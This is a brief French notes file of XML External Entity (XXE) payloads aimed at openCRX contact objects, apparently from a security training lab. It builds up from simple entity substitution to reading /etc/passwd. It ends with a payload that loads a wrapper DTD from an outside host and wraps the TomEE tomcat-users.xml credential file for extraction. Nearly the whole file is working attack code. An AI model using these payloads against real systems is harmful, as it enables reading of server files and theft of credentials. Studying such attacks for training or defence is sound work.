# Payloads

## Exemple basique

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY lastname "Replaced">
    ]>
    <org.opencrx.kernel.account1.Contact>
      <lastName>&lastname;</lastName>
      <firstName>Tom</firstName>
    </org.opencrx.kernel.account1.Contact>

## Test avec /etc/passwd

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ELEMENT data ANY >
    <!ENTITY lastname SYSTEM "file:///etc/passwd">
    ]>
    <org.opencrx.kernel.account1.Contact>
      <lastName>&lastname;</lastName>
      <firstName>Tom</firstName>
    </org.opencrx.kernel.account1.Contact>

## Exemple de wrapper (fichier wrapper.dtd)

    <!ENTITY wrapper "%start;%file;%end;">

## Payload final incluant notre wrapper 

    <?xml version="1.0"?>
    <!DOCTYPE data [
    <!ENTITY % start "<![CDATA[">
    <!ENTITY % file SYSTEM "file:///home/student/crx/apache-tomee-plus-7.0.5/conf/tomcat-users.xml" >
    <!ENTITY % end "]]>">
    <!ENTITY % dtd SYSTEM "http://192.168.119.120/wrapper.dtd" >
    %dtd;
    ]>
    <org.opencrx.kernel.account1.Contact>
      <lastName>&wrapper;</lastName>
      <firstName>Tom</firstName>
    </org.opencrx.kernel.account1.Contact>

